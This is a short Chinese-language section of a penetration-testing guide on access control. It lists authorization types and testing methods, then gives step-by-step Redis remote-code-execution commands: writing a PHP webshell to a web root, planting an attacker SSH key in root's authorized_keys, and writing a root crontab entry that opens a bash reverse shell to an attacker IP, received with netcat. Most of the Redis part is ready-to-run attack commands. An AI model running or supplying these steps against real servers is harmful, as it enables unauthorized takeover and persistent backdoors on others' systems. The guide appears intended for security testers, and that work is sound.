
### 3.10、访问控制

**授权方式**

- 用户有限制的访问资源
- 基于URL的访问控制
- 基于方法的访问控制
- 基于数据的访问控制

**测试方法**

- 非授权访问
- 权限绕过
- 敏感信息泄露
- 越权操作
- redis RCE

1）redis RCE利用方式1：写webshell

```
> config set dir /home/wwwroot/default/
> config set dbfilename redis.php
> set webshell "<?php phpinfo();?>"
> save
```
2）redis RCE利用方式2：写authorized_keys

```
# 生成key命令
> ssh-keygen -t rsa
# 将公钥导入foo.txt文件中
> (echo -e "\n\n";catid_rsa.pub;echo -e "\n\n") > foo.txt
# 将foo.txt文件内容写入到目标主机的缓冲中
> cat ~/.ssh/foo.txt | ./redis-cli -h 192.168.116.134 -x set crackit
# 连接目标主机的redis
> redis-cli -h 192.168.116.134

# 设置备份路径
> config set dir /root/.ssh/ 
# 输出 redis 安装目录
> config get dir
# 保存文件名
> config set dbfilename "authorized_keys"
# 将数据保存在服务器硬盘中
> save
```
3）redis RCE利用方式3：crontab反弹shell

```
# 192.168.116.134为受攻击目标

> ./redis-cli -h 192.168.116.134 flushall

> echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/xxx.xxx.xx.120/8053 0>&1\n\n"|redis-cli -h 192.168.116.134 -x set 1

> ./redis-cli -h 192.168.116.134 config set dir /var/spool/cron/

> ./redis-cli -h 192.168.116.134 config set dbfilename root

> ./redis-cli -h 192.168.116.134 save

# 执行完毕后，在攻击主机执行nc命令，获取shell

> nc -lvvp 8053

```

**越权**

开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。

- 水平越权

- 垂直越权
